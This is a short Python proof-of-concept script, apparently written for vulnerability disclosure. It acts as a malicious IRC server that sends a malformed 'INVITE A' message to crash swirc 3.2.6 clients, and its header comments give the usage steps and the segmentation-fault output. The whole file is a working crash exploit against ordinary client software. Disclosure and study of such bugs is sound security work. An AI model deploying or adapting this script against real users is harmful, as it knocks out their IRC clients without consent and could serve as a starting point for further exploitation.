#!/usr/bin/python
# SPDX-License-Identifier: MIT
# Copyright (c) 2021 Michael Ortmann

# Description:
#
#   swirc.msg.py is a proof of concept for malicious irc server message could
#   crash swirc.
#
#   Compatible with python 2 and 3.
#
# Example:
#
#   $ python swirc.msg.py
#   listening on host 0.0.0.0 port 6667
#
#   $ swirc -s 127.0.0.1 -n alice
#
#   sent malicious message to host 127.0.0.1 port 40526
#
#   Segmentation fault (core dumped)
#
# Tested on:
#
#   swirc 3.2.6

import socket

host = ""
port = 6667

address = (host, port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(address)
s.listen(10)
print("listening on host %s port %s" % s.getsockname());

conn, address = s.accept()
data = conn.recv(512)
conn.sendall("INVITE A\n".encode('utf-8'))
print("sent malicious message to host %s port %s" % address)
conn.close()
